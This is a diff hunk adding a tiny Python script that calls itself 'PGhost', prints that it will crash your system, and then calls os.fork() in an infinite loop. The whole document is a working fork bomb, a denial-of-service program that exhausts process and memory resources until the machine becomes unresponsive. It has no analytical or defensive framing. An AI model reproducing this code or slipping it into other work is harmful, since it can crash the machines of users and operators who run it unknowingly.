@@ -1,0 +1,4 @@
+import os
+print ('Hi, I am PGhost, and I will crash your system !!!')
+while (True):
+    os.fork()
